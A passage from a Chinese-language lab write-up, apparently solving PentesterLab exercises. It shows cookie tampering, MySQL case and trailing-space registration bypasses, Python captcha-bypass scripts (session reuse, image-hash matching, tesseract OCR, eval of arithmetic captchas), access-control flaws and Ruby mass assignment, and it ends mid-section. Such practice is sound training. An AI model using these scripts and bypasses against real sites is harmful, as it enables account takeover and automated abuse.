&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Use&nbsp;Time:&nbsp;{},&nbsp;password:{}&quot;.format(time.time()-start,&nbsp;password&nbsp;+&nbsp;pwd)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3. 使用user1的帐号登录，认证为admin。 &nbsp;这个在设置代理之后，可以看到认证user1之后会在cookie字段有一个user:user1字段，改成admin之后就可以通过</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0114ddefacf1d3f0a1.jpg" title="t010bb86a0f8879a960.jpg" alt="http://p7.qhimg.com/t010bb86a0f8879a960.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4. 目的与上一题一样，只是将cookie中的user字段由明文改成md5值</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01eaa5059a6f3dcf7b.jpg" title="t01442b98e5ae727399.jpg" alt="http://p9.qhimg.com/t01442b98e5ae727399.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5. 已经有一个admin用户，让我们认证它。 &nbsp;同时提供了一个注册的接口。 在mysql中，大小写不敏感，所以可以注册一个Admin 来绕过认证</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6. 题同第5个一样，不过这次转换成了小写，之前的手段不成功了。但是在mysql中会自动将后边的空格过滤掉，这样我们可以注册一个admin来绕过。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">MariaDB&nbsp;[blog]&gt;&nbsp;insert&nbsp;user&nbsp;value&nbsp;(1,&nbsp;&quot;admin&quot;,&nbsp;&quot;admin&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;-&gt;&nbsp;;
Query&nbsp;OK,&nbsp;1&nbsp;row&nbsp;affected&nbsp;(0.01&nbsp;sec)
MariaDB&nbsp;[blog]&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;user;
+----+----------+----------+
|&nbsp;id&nbsp;|&nbsp;username&nbsp;|&nbsp;password&nbsp;|
+----+----------+----------+
|&nbsp;&nbsp;1&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;|
+----+----------+----------+
1&nbsp;row&nbsp;in&nbsp;set&nbsp;(0.00&nbsp;sec)
MariaDB&nbsp;[blog]&gt;&nbsp;insert&nbsp;user&nbsp;value&nbsp;(1,&nbsp;&quot;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;,&nbsp;&quot;admin&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;-&gt;&nbsp;;
ERROR&nbsp;1062&nbsp;(23000):&nbsp;Duplicate&nbsp;entry&nbsp;&#39;1&#39;&nbsp;for&nbsp;key&nbsp;&#39;PRIMARY&#39;
MariaDB&nbsp;[blog]&gt;&nbsp;insert&nbsp;user&nbsp;value&nbsp;(2,&nbsp;&quot;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;,&nbsp;&quot;admin&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;-&gt;&nbsp;;
Query&nbsp;OK,&nbsp;1&nbsp;row&nbsp;affected&nbsp;(0.00&nbsp;sec)
MariaDB&nbsp;[blog]&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;user;
+----+-------------+----------+
|&nbsp;id&nbsp;|&nbsp;username&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;password&nbsp;|
+----+-------------+----------+
|&nbsp;&nbsp;1&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;|
|&nbsp;&nbsp;2&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;|
+----+-------------+----------+
2&nbsp;rows&nbsp;in&nbsp;set&nbsp;(0.00&nbsp;sec)
MariaDB&nbsp;[blog]&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;user&nbsp;where&nbsp;username=&quot;admin&quot;
&nbsp;&nbsp;&nbsp;&nbsp;-&gt;&nbsp;;
+----+-------------+----------+
|&nbsp;id&nbsp;|&nbsp;username&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;password&nbsp;|
+----+-------------+----------+
|&nbsp;&nbsp;1&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;|
|&nbsp;&nbsp;2&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;|
+----+-------------+----------+
2&nbsp;rows&nbsp;in&nbsp;set&nbsp;(0.00&nbsp;sec)
MariaDB&nbsp;[blog]&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;user&nbsp;where&nbsp;username=&quot;admin&nbsp;&nbsp;&nbsp;&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;-&gt;&nbsp;;
+----+-------------+----------+
|&nbsp;id&nbsp;|&nbsp;username&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;password&nbsp;|
+----+-------------+----------+
|&nbsp;&nbsp;1&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;|
|&nbsp;&nbsp;2&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;|
+----+-------------+----------+
2&nbsp;rows&nbsp;in&nbsp;set&nbsp;(0.00&nbsp;sec)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">验证码</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">1.</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个很简单，只需要把验证码参数删掉就可以</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01d71d2309f0432101.png" title="t018ec1372b90df301c.png" alt="http://p8.qhimg.com/t018ec1372b90df301c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看一下后台的代码：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01ac4411d6c69a4e7c.png" title="t01edec1fbb7005696e.png" alt="http://p0.qhimg.com/t01edec1fbb7005696e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2. 这个也很简单，在表单中就有正确的captcha的内容。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01aa6569d7c35d4081.png" title="t01a95778b6d08b1d41.png" alt="http://p5.qhimg.com/t01a95778b6d08b1d41.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3. 这次在cookie中</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t013b928236aa87aa86.png" title="t01f202c47002b67232.png" alt="http://p5.qhimg.com/t01f202c47002b67232.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4. 这个其实并没有理解是什么意思… 只好把官方的答案放在这了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">This is quite a funny example, since it&#39;s a mistake I made during the development of this set of exercises.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这其实是一个很有意思的例子，因为这是我做这系列练习时候的一个错误</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Here, you don&#39;t have to really crack the captcha. You just need to crack it once and you can reuse the same value and session ID to perform the same request again and again. When you try to crack a captcha, make sure that an answer can only be used once. You can easily script this exploitation by writing a script that takes a session ID and a value for parameters, and submit them again and again.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这，你不必真正的暴破验证码。你只需要破解一次然后可以重复使用只一个值和sessionid。 当你尝试破解一个验证码时， 要确保一个答案只可以被使用一次。 你可以轻易的用带sessionid与值为参数的脚本来重复提交来暴破它。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">照着这个例子写了一个函数，也不知道对不对..</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">def&nbsp;captcha4():
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;http://10.108.40.237/captcha/example4/submit?captcha=amber&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot;
&nbsp;&nbsp;&nbsp;&nbsp;header&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Cookie&quot;&nbsp;:&nbsp;(&quot;rack.session=e4fd1291b79bf27d8728c7f3bc4e5f9f55f2610794ea476f5b3a5bf5009a8eb4&quot;),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Referer&quot;&nbsp;:&nbsp;&quot;http://10.108.40.237/captcha/example4/&quot;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;=&nbsp;requests.session()
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;ss.get(url,&nbsp;headers=header)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;html.code:&nbsp;{}&quot;.format(html.status_code)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;Success&quot;&nbsp;in&nbsp;html.text:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[*]&nbsp;Done&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[-]&nbsp;Error&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5. 多提交几次，就会发现这个验证码样本很少。我们可以把它都保存下来，然后每次用验证码与保存下来的做对比。就可以搞定。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">def&nbsp;captcha5():
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;http://192.168.60.114/captcha/example5/&quot;
&nbsp;&nbsp;&nbsp;&nbsp;post_url&nbsp;=&nbsp;&quot;http://192.168.60.114/captcha/example5/submit?captcha={}&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;base_url&nbsp;=&nbsp;&quot;http://10.108.40.237/&quot;
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;=&nbsp;requests.session()
&nbsp;&nbsp;&nbsp;&nbsp;captcha&nbsp;=&nbsp;{}
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;get&nbsp;pic&nbsp;md5
&nbsp;&nbsp;&nbsp;&nbsp;dirs,folder,files&nbsp;=&nbsp;os.walk(&quot;./pic/&quot;).next()
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;fi&nbsp;in&nbsp;files:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;fi.endswith(&quot;png&quot;):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;path&nbsp;=&nbsp;os.path.join(dirs,&nbsp;fi)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(path,&nbsp;&quot;rb&quot;)&nbsp;as&nbsp;f:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;md5&nbsp;=&nbsp;hashlib.md5(f.read()).hexdigest()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;fi,&nbsp;fi[0:&nbsp;-4]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;captcha[md5]&nbsp;=&nbsp;fi[0:&nbsp;-4]
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;get&nbsp;pic
&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;ss.get(url)
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;html.text
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;html.content
&nbsp;&nbsp;&nbsp;&nbsp;soup&nbsp;=&nbsp;BeautifulSoup(html.text,&nbsp;&quot;html.parser&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;src&nbsp;=&nbsp;soup.select(&quot;img&quot;)[0][&quot;src&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;src
&nbsp;&nbsp;&nbsp;&nbsp;img_data&nbsp;=&nbsp;ss.get(url&nbsp;+&nbsp;src).content
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[+]&nbsp;img_url:&nbsp;{}&quot;.format(url&nbsp;+&nbsp;src)
&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(&quot;pic.png&quot;,&nbsp;&quot;wb&quot;)&nbsp;as&nbsp;f:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(img_data)
&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(&quot;pic.png&quot;,&nbsp;&quot;rb&quot;)&nbsp;as&nbsp;f:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;img_md5&nbsp;=&nbsp;hashlib.md5(f.read()).hexdigest()
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;img_md5&nbsp;in&nbsp;captcha:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;ss.get(post_url.format(captcha[img_md5]))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;img_content:&nbsp;{}&quot;.format(captcha[img_md5])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;post_url:&nbsp;{}&quot;.format(post_url.format(captcha[img_md5]))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;html.text
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;Success&quot;&nbsp;in&nbsp;html.text:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[+]&nbsp;Successful..&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[-]&nbsp;Somethine&nbsp;Wrong&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">6. 第六题与第七题都可以用tesseract来识别，不需要做其它的操作，所以脚本都写在一个函数了。这里只试了一次，到时候可根据情况来看是否需要写个循环来提交。因为正确率可能不是100%。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">def&nbsp;captcha67():
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;http://10.108.40.237/captcha/example8/&quot;
&nbsp;&nbsp;&nbsp;&nbsp;login_url&nbsp;=&nbsp;&quot;http://10.108.40.237/captcha/example8/submit?captcha={}&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot;
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;=&nbsp;requests.session()
&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;ss.get(url).text
&nbsp;&nbsp;&nbsp;&nbsp;soup&nbsp;=&nbsp;BeautifulSoup(html,&nbsp;&quot;html.parser&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;pic_src&nbsp;=&nbsp;soup.select(&quot;img&quot;)[0][&quot;src&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;img_data&nbsp;=&nbsp;ss.get(url&nbsp;+&nbsp;pic_src).content
&nbsp;&nbsp;&nbsp;&nbsp;img_name&nbsp;=&nbsp;&quot;captcha6.png&quot;
&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(img_name,&nbsp;&quot;wb&quot;)&nbsp;as&nbsp;f:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(img_data)
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;img_2_str(filename):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd&nbsp;=&nbsp;&quot;tesseract&nbsp;{}&nbsp;{}&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;cmd.format(filename,&nbsp;filename)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strs&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;subprocess.check_output(cmd.format(filename,&nbsp;filename),&nbsp;shell=True)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(filename+&quot;.txt&quot;,&nbsp;&quot;r&quot;)&nbsp;as&nbsp;f:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strs&nbsp;=&nbsp;f.read().strip()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;strs
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[-]&nbsp;Error&nbsp;Happend!&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;strs
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;img_2_str(img_name)
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;result&nbsp;!=&nbsp;&quot;&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;ss.get(login_url.format(result)).text
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;Success&quot;&nbsp;in&nbsp;html:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[+]&nbsp;OK!&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">7. 第8题的验证码需要做处理，同时还要分粘连的情况… 这题没做好，去噪这一部分我做了，但是处理粘连没有做好，所以识别不出来。放上几个链接吧。</span><a href="http://static.hx99.net/static/drops/tips-4550.html" target="_blank" textvalue="初探验证码识别" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0); text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">初探验证码识别</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">，</span><a href="http://static.hx99.net/static/drops/tips-141.html" target="_blank" textvalue="常见验证码的弱点与验证码识别" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0); text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">常见验证码的弱点与验证码识别</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">，</span><a href="http://static.hx99.net/static/drops/tips-13043.html" target="_blank" textvalue="简单验证码识别及工具编写思路" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0); text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">简单验证码识别及工具编写思路</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">8. 第9题的验证码是题解，并且不是写在图片上的，可以直接正则匹配出来然后计算识别提交。脚本如下:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">def&nbsp;captcha9():
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;http://10.108.40.237/captcha/example9/&quot;
&nbsp;&nbsp;&nbsp;&nbsp;post_url&nbsp;=&nbsp;&quot;http://10.108.40.237/captcha/example9/submit?captcha={}&amp;submit=Submit&quot;
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;=&nbsp;requests.session()
&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;ss.get(url).text
&nbsp;&nbsp;&nbsp;&nbsp;soup&nbsp;=&nbsp;BeautifulSoup(html,&nbsp;&quot;html.parser&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;form&nbsp;=&nbsp;soup.select(&quot;form&quot;)[0].text
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;((form.strip()))
&nbsp;&nbsp;&nbsp;&nbsp;captcha&nbsp;=&nbsp;re.match(r&quot;(\d+[\+\-\*\/]\d+)\s+=&quot;,&nbsp;(form.strip()))
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;captcha:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;&nbsp;eval(captcha.group(1))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;ss.get(post_url.format(result)).text
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;Success&quot;&nbsp;in&nbsp;html:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[+]&nbsp;OK&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">授权</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">1. 这是一个未授权访问，只要知道了url，不用登录也可以访问。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t0192e35c51a07fef30.png" title="t01eb6081284c376bdf.png" alt="http://p2.qhimg.com/t01eb6081284c376bdf.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2. 登录user1/pentesterlab 并访问user2的内容。即水平权限提升。User1只有infos/1 &nbsp;infos/2两个文件，但是访问infos/3, 即user2的内容时，也可以访问的到。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t013dce299d8f0ac941.png" title="t018cc181d9bba82b2d.png" alt="http://p3.qhimg.com/t018cc181d9bba82b2d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3. 与上一题一样，使用user1的帐户访问user2的内容。不过这次是在修改的时候。只能看到…</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0152e62fb92665706f.png" title="t016819217f1cf8c11e.png" alt="http://p7.qhimg.com/t016819217f1cf8c11e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">覆盖属性</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在web开发的时候，如果用数据库做存储时会有很多手工写的sql语句。为了方便开发人员，于是开发出了对象关系映射（Object-relational mapping） 以方便不懂sql的开发人员来做数据库的操作。在ruby中，可以用@user=User.find_by_name(‘pentesterlab’) 来进行数据库的查询与结果的返回。除此之外还有创建与更新等操作。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但这并不能保证安全性，如果开发人员没有对参数做好判断，就会出现重置某些属性的问题。这就是覆盖属性。 下边看几个例子。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;1. 目的是创建个admin权限的用户。观察参数，发现是user[username]=&amp;user[password]= 那么我们试着添加一个admin 属性。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01acd1c31cd80bb2fe.png" title="t013e9912e9c8a617df.png" alt="http://p0.qhimg.com/t013e9912e9c8a617df.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2. 目的同1一样，创建一个admin权限的用户。但是在创建时并不行。那么我们创建一个普通用户进去，发现有一个更新简历，那么在更新处添加admin属性就可以。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t017f0d217e48f5c843.png" title="t017d691557d755ff26.png" alt="http://p8.qhimg.com/t017d691557d755ff26.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3. 同前2个差不多，但是这里要猜一个company_id的字段。因为在一对多的结构中，即一个company对应多个user，那么在user表中会多一个company_id的外键指向company表。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01d0d2483ef584c3b6.png" title="t0146e54734460b0914.png" alt="http://p5.qhimg.com/t0146e54734460b0914.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, 